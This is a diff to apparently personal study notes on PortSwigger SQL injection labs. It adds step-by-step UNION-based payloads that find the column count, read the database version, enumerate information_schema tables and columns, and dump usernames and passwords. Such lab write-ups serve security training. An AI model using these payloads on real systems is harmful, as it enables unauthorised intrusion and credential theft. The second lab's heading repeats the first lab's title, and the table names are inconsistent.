@@ -56,7 +56,7 @@ Ref: https://www.techonthenet.com/oracle/questions/version.php
 
 ###### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
-Endpoint:
+Endpoint: category
 
 Steps:
 ```
@@ -70,10 +70,39 @@ Steps:
 	3c. category=Gifts'+ORDER+BY+3--
 	Response: Internal server error
 4. Now we know that there are 2 items in the query.
-5. Check the type of items in the query using:
-6. category=Gifts'+UNION+SELECT+@@VERSION,'a'--+
+5. category=Gifts'+UNION+SELECT+@@VERSION,'a'--+
    Response: Database version information
 ```
 
 Note: Database name is not necessary in when using UNION SELECT on non-oracle MYSQL.
 Ref: https://www.sqlshack.com/how-to-find-sql-server-version/
+
+
+###### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+Endpoint: category
+
+Steps:
+```
+1. Click on any filter item.
+2. Add ' to verify if sql injection exists.
+3. Use the Order Clause to check the number of items that are being returned.
+	3a. category=Gifts'+ORDER+BY+1--
+	Response: Returns products
+	3b. category=Gifts'+ORDER+BY+2--
+	Response: Returns products
+	3c. category=Gifts'+ORDER+BY+3--
+	Response: Internal server error
+4. Now we know that there are 2 items in the query.
+5. category='+UNION+SELECT+table_name,'a'+FROM+information_schema.tables--+
+   Response: Databases names
+6.
+category=' UNION SELECT COLUMN_NAME,'a' FROM information_schema.columns WHERE table_name='users_uapnzk'--
+Response: All Columns in the database users_eyeiho
+7. category=' UNION+SELECT+username_rytsgw,password_ndebvk+FROM+users_uapnzk--
+   Response: List of Usernames and passwords
+```
+
+
+Ref: https://dba.stackexchange.com/questions/93919/mysql-list-databases-with-tables
+Ref: https://stackoverflow.com/questions/1580450/how-do-i-list-all-the-columns-in-a-table
